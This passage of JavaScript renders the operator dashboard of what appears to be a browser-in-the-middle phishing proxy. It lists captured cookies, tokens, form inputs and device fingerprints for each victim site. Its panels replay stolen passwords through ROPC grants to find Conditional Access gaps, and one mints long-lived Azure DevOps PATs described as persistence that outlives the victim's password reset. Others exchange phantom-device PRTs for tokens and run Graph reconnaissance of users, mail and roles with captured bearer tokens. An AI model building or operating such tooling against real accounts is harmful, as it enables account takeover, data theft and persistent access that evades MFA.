        Token is appended to <code>tokens[]</code> on this credential record so the AAA runner can use it. Password uses Connect-AzAccount (needs <code>Az.Accounts</code>, fails on an MFA tenant); device code is interactive and works with MFA.
      </div>
      <div id="aaa-login-result-${siteId}" style="font-size:13px"></div>
    </div>
  </div>`;
}
// ROPC (Resource Owner Password Credentials, RFC 6749 §4.3) test panel —
// POSTs username+password straight to the tenant's /token endpoint via
// POST /api/test-ropc, bypassing the interactive authorization endpoint
// entirely. Same guessUserPass() heuristic as the AAA snippet above, so
// the two features pre-fill identically. The AADSTS error code on
// failure is itself the finding (e.g. AADSTS50076 = CA/MFA actually
// blocked the legacy grant — policy working; a 200 on an MFA-required
// account means ROPC is an uncovered bypass path).
function renderTokenPanel(d,siteId){
  const {guessUser,guessPass}=guessUserPass(d);
  const tid=(configCache.default_tenant_id||'').trim();
  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
      <button class="btn" style="padding:2px 10px;font-size:12px;background:#132a4a;border-color:#2563eb;color:#bfdbfe"
              onclick="tokenToggle('${siteId}')"
              title="POST username+password to BOTH /oauth2/token (v1, resource=) and /oauth2/v2.0/token (v2, scope=) and compare the two CA outcomes">Test /token (v1 + v2)…</button>
    </div>
    <div id="tok-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #1e3a5f">
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
        <input id="tok-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
        <input id="tok-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
        <input id="tok-tid-${siteId}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain — NOT common/consumers" title="Confirmed live: common/consumers reject the password grant outright with AADSTS9001023">
        <label style="color:#94a3b8;font-size:13px;min-width:64px;margin-left:6px">Client ID</label>
        <input id="tok-cid-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="29d9ed98-a469-4536-ade2-f981bc1d605e" title="Microsoft Authentication Broker — well-known public client, no app registration needed">
        <button class="btn" style="padding:3px 12px;font-size:13px;background:#132a4a;border-color:#2563eb;color:#bfdbfe" onclick="tokenRun('${siteId}')">▶ Run both</button>
      </div>
      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
        grant_type=password against both <code>/oauth2/token</code> (v1, resource=https://graph.microsoft.com) and <code>/oauth2/v2.0/token</code> (v2, scope=…/.default). The legacy v1 endpoint is frequently left with looser Conditional Access than v2 — compare the two AADSTS outcomes for the same account. Creates Azure AD sign-in log entries (legacy/non-interactive grant).
      </div>
      <div id="tok-result-${siteId}" style="font-size:13px"></div>
    </div>
  </div>`;
}
function renderRopcPanel(d,siteId){
  const {guessUser,guessPass}=guessUserPass(d);
  const tid=(configCache.default_tenant_id||'').trim();
  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
      <button class="btn" style="padding:2px 10px;font-size:12px;background:#3f1d1d;border-color:#7f1d1d;color:#fecaca"
              onclick="ropcToggle('${siteId}')"
              title="POST username+password directly to /oauth2/v2.0/token (ROPC grant) — bypasses the interactive authorization endpoint">Test ROPC…</button>
    </div>
    <div id="ropc-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
        <input id="ropc-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
        <input id="ropc-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
        <input id="ropc-tid-${siteId}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain — NOT common/consumers" title="Confirmed live: common/consumers reject the password grant outright with AADSTS9001023, before credentials are even checked">
        <label style="color:#94a3b8;font-size:13px;min-width:64px;margin-left:6px">Client ID</label>
        <input id="ropc-cid-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="29d9ed98-a469-4536-ade2-f981bc1d605e" title="Microsoft Authentication Broker — well-known public client, no app registration needed">
        <button class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="ropcRun('${siteId}')">▶ Run</button>
      </div>
      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
        grant_type=password against https://login.microsoftonline.com/&lt;tenant&gt;/oauth2/v2.0/token.
        Tenant must be "organizations" or a specific tenant, never common/consumers (AADSTS9001023).
        Creates a real Azure AD sign-in log entry (legacy/non-interactive grant — distinctly flagged).
      </div>
      <div id="ropc-result-${siteId}" style="font-size:13px"></div>
    </div>
  </div>`;
}
// Azure DevOps PAT minting panel — POSTs captured creds to
// /api/create-ado-pat, which ROPC-grants an ADO-resource token (confirmed
// live: the Azure CLI public client carries the needed delegated
// permission), discovers the account's ADO org(s), and creates a
// long-lived PAT via the PAT Lifecycle API. Same guessUserPass() pre-fill
// as ROPC/AAA. The PAT is durable credential material that survives the
// victim's password reset and is usually outside CA/MFA re-evaluation —
// framed as a finding, not a utility.
function renderAdoPatPanel(d,siteId){
  const {guessUser,guessPass}=guessUserPass(d);
  const tid=(configCache.default_tenant_id||'').trim();
  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
      <button class="btn" style="padding:2px 10px;font-size:12px;background:#3f1d1d;border-color:#7f1d1d;color:#fecaca"
              onclick="adoPatToggle('${siteId}')"
              title="ROPC to an Azure DevOps token, then mint a long-lived Personal Access Token — persistence that outlives password resets and is usually outside CA/MFA">Create ADO PAT…</button>
    </div>
    <div id="adopat-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:8px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Method</label>
        <select id="adopat-method-${siteId}" class="cfg-input" style="font-size:13px;flex:1;min-width:260px" onchange="adoPatMethodChange('${siteId}')">
          <option value="ropc" selected>ROPC — password grant (current default)</option>
          <option value="devicecode">Device code — interactive, satisfies MFA</option>
          <option value="phantomprt">Phantom PRT — exchange a roadtx.prt from a phantom run</option>
          <option value="captured">Captured token — paste an ADO-audience token</option>
        </select>
      </div>
      <div id="adopat-ropc-${siteId}">
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
          <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
          <input id="adopat-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
        </div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
          <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
          <input id="adopat-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
        </div>
      </div>
      <div id="adopat-captured-${siteId}" style="display:none">
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
          <label style="color:#94a3b8;font-size:13px;min-width:64px">Token</label>
          <input id="adopat-token-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="ADO-audience (499b84ac…) access token — from the Token dropdown or a capture">
        </div>
        <div style="color:#78859b;font-size:11px;margin:0 0 6px 70px;line-height:1.5">
          Must carry <code style="color:#fca5a5">aud = 499b84ac-1321-427f-aa17-267ca6975798</code> (Azure DevOps) — a Graph token is rejected here. Get one:
          <code style="color:#7dd3fc;display:block;margin-top:2px;white-space:pre-wrap;word-break:break-all">az account get-access-token --resource 499b84ac-1321-427f-aa17-267ca6975798 --query accessToken -o tsv</code>
          <span style="color:#5a6472">…or use the ROPC / Device-code method above, which mint an ADO-audience token for you.</span>
        </div>
      </div>
      <div id="adopat-dc-${siteId}" style="display:none;color:#78859b;font-size:12px;margin-bottom:6px">
        Click <b>Start device code</b> — you'll get a code to enter at microsoft.com/devicelogin. Completing sign-in there (with MFA) yields the ADO token, then the PAT is minted automatically. This is the path that works when ROPC is CA/MFA-blocked.
      </div>
      <div id="adopat-prt-${siteId}" style="display:none;color:#78859b;font-size:12px;margin-bottom:6px">
        Uses the newest <code>roadtx.prt</code> from a completed <b>Phantom Join</b> run (under <code>$DATA_DIR/phantom/</code>). Runs <code>roadtx prtauth -r 499b84ac-…</code> to trade the PRT for an ADO-audience token, then mints the PAT — the path that works when device-code / ROPC are CA-blocked on the ADO resource, because the PRT carries device claims. Optional explicit path:
        <input id="adopat-prtpath-${siteId}" class="cfg-input" style="width:100%;margin-top:4px;font-size:12px" placeholder="blank = newest phantom PRT; or /data/phantom/&lt;run&gt;/phantom_join_&lt;ts&gt;/roadtx.prt">
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
        <input id="adopat-tid-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain">
        <label style="color:#94a3b8;font-size:13px;margin-left:6px">ADO org</label>
        <input id="adopat-org-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" value="${esc((configCache.default_ado_org||'').trim())}" placeholder="blank = auto-discover" title="Leave blank to discover the account's org(s) via the vssps accounts API and use the first. Default comes from Settings → Azure / ADO defaults → default ado org.">
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
        <label style="color:#94a3b8;font-size:13px;min-width:64px">PAT name</label>
        <input id="adopat-name-${siteId}" class="cfg-input" style="flex:1;min-width:140px;font-size:13px" value="bitm-proxy">
        <label style="color:#94a3b8;font-size:13px;margin-left:6px">Scope</label>
        <input id="adopat-scope-${siteId}" class="cfg-input" style="flex:1;min-width:140px;font-size:13px" value="app_token" title="app_token = full access; or a space-delimited list like 'vso.code vso.build'">
        <label style="color:#94a3b8;font-size:13px;margin-left:6px">Valid days</label>
        <input id="adopat-days-${siteId}" class="cfg-input" type="number" min="1" max="365" style="width:72px;font-size:13px" value="90">
        <label style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px" title="allOrgs=true issues a PAT valid against every org the identity can reach"><input type="checkbox" id="adopat-allorgs-${siteId}"> all orgs</label>
        <button id="adopat-orgs-${siteId}" class="btn" style="padding:3px 12px;font-size:13px;background:#1e3a5f" onclick="adoOrgsGo('${siteId}')" title="List the account's Azure DevOps organizations (vssps accounts API) with the selected method's token — no PAT is created">☰ List ADO orgs</button>
        <button id="adopat-go-${siteId}" class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="adoPatGo('${siteId}')">▶ Create</button>
      </div>
      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
        Acquires an Azure DevOps token (${esc('499b84ac')}…) by the selected method → POST /_apis/tokens/pats. Creates a real, listable PAT plus an Azure AD sign-in log entry.
        Durable credential — survives password reset, usually outside CA/MFA. Revoke from ADO → User settings → Personal access tokens when done.
      </div>
      <div id="adopat-result-${siteId}" style="font-size:13px"></div>
    </div>
  </div>`;
}
function renderCapturedHeaders(d,siteId){
  const ch=d.captured_headers;if(!ch||!Object.keys(ch).length)return'';
  const entries=Object.entries(ch).sort((a,b)=>(b[1].captured_at||0)-(a[1].captured_at||0));
  const rows=entries.map(([name,info])=>{
    const age=Math.round((Date.now()/1000-info.captured_at)/60);
    const ageStr=age<1?'just now':age<60?age+'m ago':Math.round(age/60)+'h ago';
    const valShort=info.value.length>80?info.value.slice(0,80)+'...':info.value;
    return`<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid #222">
      <span style="color:#f472b6;font-weight:600;min-width:160px;font-size:13px">${esc(name)}</span>
      <span style="color:#cbd5e1;flex:1;font-size:13px;word-break:break-all" title="${esc(info.value)}">${esc(valShort)}</span>
      <span style="color:#78859b;font-size:13px;white-space:nowrap">${ageStr}</span>
      <button class="btn" style="padding:2px 8px;font-size:13px;white-space:nowrap" onclick="copyToClipboard(decodeURIComponent('${encodeURIComponent(info.value)}'),this)">Copy</button>
    </div>`;
  }).join('');
  const apiUrl=`/api/headers/${siteId}`;
  return`<div style="margin-bottom:12px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
      <div style="color:#f472b6;font-weight:bold">Captured Headers (${entries.length})</div>
      <span style="color:#78859b;font-size:13px">API: <a href="${apiUrl}" target="_blank" style="color:#60a5fa">${apiUrl}</a></span>
    </div>
    <div style="background:#0a0a14;padding:8px;border-radius:4px">${rows}</div>
  </div>`;
}
function _isPlainJWT(t){return typeof t==='string'&&t.split('.').length===3&&t.startsWith('eyJ0')}
function _findLatestToken(tokens){
  // Find the most recent access_token, preferring plain JWTs over encrypted JWE
  let bestJwt=null,bestJwtTime=0,bestAny=null,bestAnyTime=0;
  const fields=['access_token','accessToken','token'];
  for(const tok of tokens){
    const t=tok.captured_at||0;
    for(const f of fields){
      if(tok[f]&&typeof tok[f]==='string'){
        if(_isPlainJWT(tok[f])&&t>=bestJwtTime){bestJwt=tok[f];bestJwtTime=t}
        if(t>=bestAnyTime){bestAny=tok[f];bestAnyTime=t}
        break;
      }
    }
  }
  return bestJwt||bestAny;
}
function renderTokens(tokens,siteId){
  if(!tokens||!tokens.length)return'';
  const tokenFields=['access_token','accessToken','id_token','idToken','token','jwt','sessionToken'];
  const refreshFields=['refresh_token','refreshToken'];
  const metaFields=['source_url','captured_at','expires_in','expiresIn','expires_on','ext_expires_in','scope','token_type','tokenType','session_state','client_info'];
  // Sort newest-first so the current token surfaces at the top
  // and previous tokens collapse behind a details toggle. The
  // underlying array is preserved on disk; we only restructure
  // the view.
  const sorted=tokens.slice().sort((a,b)=>(b.captured_at||0)-(a.captured_at||0));
  const latest=_findLatestToken(sorted);

  function _tokenBlockHtml(tok, isCurrent){
    const age=tok.captured_at?Math.round((Date.now()/1000-tok.captured_at)/60):null;
    const ageStr=age===null?'':age<1?'just now':age<60?age+'m ago':Math.round(age/60)+'h ago';
    let bh='<div style="background:#0a0a14;padding:8px;border-radius:4px;margin-bottom:6px'+
      (isCurrent?';border-left:3px solid #4ade80':'')+'">';
    const label=isCurrent?'<span style="color:#4ade80;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-right:8px">CURRENT</span>':'';
    if(ageStr||isCurrent)bh+=`<div style="color:#78859b;font-size:13px;margin-bottom:4px">${label}${esc(ageStr)}${tok.source_url?' — '+esc(tok.source_url.slice(0,100)):''}</div>`;
    for(const f of tokenFields){
      if(!tok[f]||typeof tok[f]!=='string')continue;
      const val=tok[f];
      const preview=val.length>80?val.slice(0,80)+'...':val;
      bh+=`<div style="display:flex;align-items:center;gap:6px;padding:3px 0;border-bottom:1px solid #1a1a2e">
        <span style="color:#4ade80;font-weight:600;min-width:120px;font-size:13px">${esc(f)}</span>
        <span style="color:#cbd5e1;flex:1;font-size:13px;word-break:break-all" title="${esc(val)}">${esc(preview)}</span>
        <button class="btn" style="padding:2px 6px;font-size:13px;white-space:nowrap" onclick="copyToClipboard(decodeURIComponent('${encodeURIComponent(val)}'),this)">Copy</button>
        <button class="btn" style="padding:2px 6px;font-size:13px;white-space:nowrap;background:#1e3a5f" onclick="copyToClipboard('Bearer '+decodeURIComponent('${encodeURIComponent(val)}'),this)">Bearer</button>
        <button class="btn" style="padding:2px 6px;font-size:13px;white-space:nowrap;background:#065f46" onclick="testGraphDirect(decodeURIComponent('${encodeURIComponent(val)}'),this,'${siteId}')">Graph</button>
      </div>`;
    }
    for(const f of refreshFields){
      if(!tok[f]||typeof tok[f]!=='string')continue;
      const val=tok[f];
      const preview=val.length>60?val.slice(0,60)+'...':val;
      bh+=`<div style="display:flex;align-items:center;gap:6px;padding:3px 0;border-bottom:1px solid #1a1a2e">
        <span style="color:#fbbf24;font-weight:600;min-width:120px;font-size:13px">${esc(f)}</span>
        <span style="color:#cbd5e1;flex:1;font-size:13px;word-break:break-all" title="${esc(val)}">${esc(preview)}</span>
        <button class="btn" style="padding:2px 6px;font-size:13px;white-space:nowrap" onclick="copyToClipboard(decodeURIComponent('${encodeURIComponent(val)}'),this)">Copy</button>
      </div>`;
    }
    const meta=metaFields.filter(f=>tok[f]&&f!=='source_url'&&f!=='captured_at').map(f=>`${f}: ${tok[f]}`);
    if(meta.length)bh+=`<div style="color:#78859b;font-size:13px;padding-top:4px">${esc(meta.join(' | '))}</div>`;
    bh+='</div>';
    return bh;
  }

  let h='<div style="margin-bottom:12px"><div style="display:flex;align-items:center;gap:8px;margin-bottom:6px"><div style="color:#4ade80;font-weight:bold">Tokens ('+sorted.length+')</div>';
  if(latest){
    h+=`<button class="btn" style="padding:3px 10px;font-size:13px;background:#065f46" onclick="testGraphDirect(decodeURIComponent('${encodeURIComponent(latest)}'),this,'${siteId}')">Test Graph /me</button>`;
    h+=`<span id="graph-quick-result" style="font-size:13px"></span>`;
  }
  h+='</div>';

  // Current token = newest. Previous up to 5 collapsed. Anything
  // older than that is hidden but stays in the underlying record;
  // the count + a delete-old button surface it.
  const current=sorted[0];
  const prev=sorted.slice(1,6);
  const olderCount=Math.max(0, sorted.length-6);
  if(current)h+=_tokenBlockHtml(current, true);
  if(prev.length){
    h+=`<details style="margin:0 0 6px 0">
      <summary style="cursor:pointer;color:#94a3b8;font-size:13px;padding:4px 0">Previous ${prev.length} token${prev.length===1?'':'s'} ▾</summary>
      <div style="padding-top:6px">${prev.map(t=>_tokenBlockHtml(t,false)).join('')}</div>
    </details>`;
  }
  if(olderCount){
    h+=`<div style="color:#64748b;font-size:12px;padding:4px 0;display:flex;align-items:center;gap:8px">
      ${esc(String(olderCount))} older token${olderCount===1?'':'s'} hidden (still on disk).
      <button class="btn" style="padding:1px 8px;font-size:11px"
        onclick="event.stopPropagation();if(confirm('Trim ${esc(String(olderCount))} oldest tokens for this site?'))send({cmd:'trim_old_tokens',site_id:'${esc(siteId)}',keep:6})">Trim oldest</button>
    </div>`;
  }
  h+='</div>';
  return h;
}
function renderFingerprintSummary(fp){
  if(!fp)return'(no fingerprint data)';
  const screen=fp.screen||{};
  const webgl=fp.webgl||{};
  const confidenceColor=fp.fingerprint_confidence>=0.95?'#86efac':(fp.fingerprint_confidence>=0.8?'#fbbf24':'#f87171');
  const devType=fp.platform?.includes('Mac')?'Apple Mac':(fp.platform?.includes('Win')?'Windows':(fp.platform?.includes('Linux')?'Linux':'Unknown'));
  const screenStr=screen.w&&screen.h?`${screen.w}×${screen.h}`:'-';
  const dprStr=screen.dpr?`${screen.dpr}x`:'';
  const colorStr=screen.color_depth?`${screen.color_depth}-bit`:'';

  return`<div style="font-family:monospace;line-height:1.7">
<span style="color:#7dd3fc">🖥️ DEVICE</span>
  Type: <span style="color:#a78bfa">${esc(devType)}</span>
  Processor: <span style="color:#a78bfa">${esc(fp.hw_concurrency||'?')}</span>-core
  GPU: <span style="color:#a78bfa">${esc(webgl.vendor||'Unknown')}</span>

<span style="color:#7dd3fc">📺 DISPLAY</span>
  Resolution: <span style="color:#a78bfa">${screenStr}</span> ${dprStr}${colorStr}
  Viewport: <span style="color:#a78bfa">${fp.viewport?.w||'?'}×${fp.viewport?.h||'?'}</span>

<span style="color:#7dd3fc">🌍 LOCATION</span>
  Timezone: <span style="color:#a78bfa">${esc(fp.timezone||'Unknown')}</span>
  Languages: <span style="color:#a78bfa">${esc((fp.languages||[]).join(', ')||'?')}</span>

<span style="color:#7dd3fc">🌐 BROWSER</span>
  User-Agent: <span style="color:#cbd5e1;font-size:11px">${esc((fp.user_agent||'?').substring(0,70))}${(fp.user_agent||'').length>70?'…':''}</span>
  Platform: <span style="color:#a78bfa">${esc(fp.platform||'?')}</span>

<span style="color:#7dd3fc">🔑 FINGERPRINT</span>
  Visitor ID: <span style="color:#a78bfa">${esc((fp.fingerprint_id||'none').substring(0,16))}</span>
  Confidence: <span style="color:${confidenceColor};font-weight:bold">${(fp.fingerprint_confidence||0).toFixed(2)}</span> ${fp.fingerprint_confidence>=0.95?'(very unique)':fp.fingerprint_confidence>=0.8?'(unique)':'(common)'}

<span style="color:#7dd3fc">📊 UNIQUENESS</span>
  <span style="color:#cbd5e1">This device is ${fp.fingerprint_confidence>=0.95?'<b>highly distinctive</b> — easy to re-identify':fp.fingerprint_confidence>=0.8?'<b>fairly unique</b>':'<b>common</b>'}</span>
  ${screen.w>1600?'<span style="color:#fbbf24">⚠</span> High-res display (distinctive)':''}
  ${fp.hw_concurrency>=16?'<span style="color:#fbbf24">⚠</span> High core count (distinctive)':''}
  ${fp.platform?.includes('Mac')&&fp.hw_concurrency?'<span style="color:#fbbf24">⚠</span> Mac with ${fp.hw_concurrency} cores (Apple Silicon likely)':''}

<span style="color:#7dd3fc">🕐 CAPTURED</span>
  Time: <span style="color:#cbd5e1">${new Date(Math.round((fp.captured_at||Date.now()/1000)*1000)).toLocaleString()}</span>
</div>`;
}
function renderCreds(){
  const el=document.getElementById('creds-list');
  if(!sitesCache.length){el.innerHTML='<div style="color:#78859b;font-size:13px">No captured data. Use browser on :8091.</div>';return}
  el.innerHTML=sitesCache.map(site=>{
    const d=site.data||{},cc=d.cookies?.length||0,tc=d.tokens?.length||0;
    // Handle both array (new format) and object (old format) for captured_inputs
    const capturedInputsArray = Array.isArray(d.captured_inputs) ? d.captured_inputs :
                                (typeof d.captured_inputs === 'object' && d.captured_inputs ? Object.values(d.captured_inputs) : []);
    const ic = capturedInputsArray.length;
    const hc=d.captured_headers?Object.keys(d.captured_headers).length:0;
    const ls=d.local_storage?Object.keys(d.local_storage).length:0,ss=d.session_storage?Object.keys(d.session_storage).length:0;
    const mc=d.external_capture_metadata?Object.keys(d.external_capture_metadata).length:0;
    const host=site.id.replace(/_/g,'.');
    return`<div class="card">
      <div class="card-header" onclick="document.getElementById('cb-${site.id}').style.display=document.getElementById('cb-${site.id}').style.display==='none'?'':'none'">
        <div><span style="color:#7dd3fc;font-weight:600">${esc(host)}</span>
          <span style="color:#8893a7;font-size:13px;margin-left:8px">${hc?hc+' headers, ':''}${cc} cookies, ${tc} tokens${ic?', '+ic+' inputs':''}${mc?', fingerprint':''}</span></div>
        <div style="display:flex;gap:6px">
          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="event.stopPropagation();copyCred('${site.id}',this)" title="Copy full credential record as JSON to clipboard">Copy</button>
          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="event.stopPropagation();exportCred('${site.id}')" title="Download full credential record as a .json file">Export</button>
          <button class="btn btn-danger" onclick="event.stopPropagation();send({cmd:'delete_credentials',site_id:'${site.id}'})">Delete</button>
        </div></div>
      <div class="card-body" id="cb-${site.id}" style="display:none">
        <div style="margin-bottom:8px;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
          <span style="color:#94a3b8;font-size:13px;font-weight:600">Test:</span>
          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testDecode('${site.id}')">Decode JWTs</button>
          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testCookies('${site.id}')">Test Cookies</button>
        </div>
        <div style="margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #333;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
          <span style="color:#6ee7b7;font-size:13px;font-weight:600" title="Read-only Microsoft Graph GET calls, run with the captured bearer token. Results depend on the token's scopes; every call lands in Azure AD sign-in logs.">Graph:</span>
          <select id="graph-fn-${site.id}" class="cfg-input" style="min-width:340px;font-size:13px">
            <option value="https://graph.microsoft.com/v1.0/me">Who am I — /me</option>
            <option value="https://graph.microsoft.com/v1.0/me/memberOf">My groups &amp; roles — /me/memberOf</option>
            <option value="https://graph.microsoft.com/v1.0/me/ownedDevices">My devices — Get-MgDevice (/me/ownedDevices)</option>
            <option value="https://graph.microsoft.com/v1.0/me/ownedObjects">Apps/groups I own — /me/ownedObjects</option>
            <option value="https://graph.microsoft.com/v1.0/me/messages?$top=10">Recent mail — /me/messages (Mail.Read)</option>
            <option value="https://graph.microsoft.com/v1.0/organization">Tenant info — /organization</option>
            <option value="https://graph.microsoft.com/v1.0/users?$top=999">Directory users — /users</option>
            <option value="https://graph.microsoft.com/v1.0/groups?$top=999">Groups — /groups</option>
            <option value="https://graph.microsoft.com/v1.0/servicePrincipals?$top=999">Service principals — /servicePrincipals</option>
            <option value="https://graph.microsoft.com/v1.0/applications?$top=999">App registrations — /applications</option>
            <option value="https://graph.microsoft.com/v1.0/directoryRoles">Active directory roles — /directoryRoles</option>
            <option value="https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments">Role assignments — /roleManagement/directory/roleAssignments</option>
            <option value="https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies">Conditional Access policies — /identity/conditionalAccess/policies</option>
            <option value="https://graph.microsoft.com/v1.0/devices?$top=999">All devices — /devices</option>
            <option value="https://graph.microsoft.com/beta/deviceManagement/managedDevices">Intune managed devices — Get-MgDeviceManagementDevice (beta)</option>
          </select>
          <input id="test-url-${site.id}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" placeholder="…or custom URL (overrides)" value="">
          <button class="btn" style="padding:3px 12px;font-size:13px;background:#065f46" onclick="graphRun('${site.id}')">Run</button>
        </div>
        <div id="test-result-${site.id}" style="margin-top:6px;margin-bottom:8px;display:none"></div>
        ${renderTokenPanel(d,site.id)}
        ${renderRopcPanel(d,site.id)}
        ${renderAdoPatPanel(d,site.id)}
        <div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
          <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
            <span style="color:#fca5a5;font-size:13px;font-weight:600" title="AbuseAzureAPIPermissions.ps1 — Hagrid29's recon/abuse helpers, invoked via pwsh with the captured Graph token">AAA:</span>
            <button class="btn" style="padding:3px 10px;font-size:13px;background:#3f1d1d;border-color:#7f1d1d;color:#fecaca" onclick="aaaTogglePanel('${site.id}')">Run function…</button>
            <span id="aaa-status-${site.id}" style="color:#78859b;font-size:13px"></span>
          </div>
          <div id="aaa-panel-${site.id}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
            <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
              <label style="color:#94a3b8;font-size:13px">Function:</label>
              <select id="aaa-fn-${site.id}" class="cfg-input" style="min-width:280px;font-size:13px" data-user="${esc((guessUserPass(d).guessUser)||'')}" data-pass="${esc((guessUserPass(d).guessPass)||'')}" data-tid="${esc((configCache.default_tenant_id||'').trim())}" onchange="aaaFnChange('${site.id}')"></select>
              <label style="color:#94a3b8;font-size:13px;margin-left:6px">Token:</label>
              <select id="aaa-tok-${site.id}" class="cfg-input" style="min-width:160px;font-size:13px">
                ${(d.tokens||[]).map((t,i)=>`<option value="${i}">tokens[${i}] (${esc((t.source_url||'').slice(0,40))})</option>`).join('')||'<option value="0">(no tokens)</option>'}
              </select>
            </div>
            <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
              <label style="color:#94a3b8;font-size:13px" title="PowerShell-style args, e.g. -UserId 'alice@…' or -Search 'helpdesk'. Names must be alphanumeric; values are single-quote-escaped.">Args:</label>
              <input id="aaa-args-${site.id}" class="cfg-input" style="flex:1;min-width:300px;font-size:13px;font-family:monospace" placeholder="-UserId 'alice@example.com' -Search 'finance'">
              <button class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="aaaRun('${site.id}')">Run</button>
            </div>
            <div style="color:#78859b;font-size:12px;margin-bottom:6px">
              Recon-only by default. Add destructive functions to <code>aaa_runner.allowed_functions</code> in <code>$DATA_DIR/sites.yaml</code>.
              <span style="color:#fbbf24">⚠</span> every call lands in Azure AD sign-in logs.
            </div>
            <div id="aaa-result-${site.id}" style="font-size:13px"></div>
          </div>
        </div>
        ${renderAaaTokenSnippet(d,site.id)}
        ${tc?renderTokens(d.tokens,site.id):''}
        ${ic?`<div style="margin-bottom:8px"><div style="color:#facc15;font-weight:bold;margin-bottom:4px">Inputs (${ic})</div><div style="background:#0a0a14;padding:8px;border-radius:4px">${capturedInputsArray.map(v=>`<div><span class="cap-label">CAPTURED_INPUT=</span><span class="cap-val">${mask(v)}</span></div>`).join('')}</div></div>`:''}
        ${renderCapturedHeaders(d,site.id)}
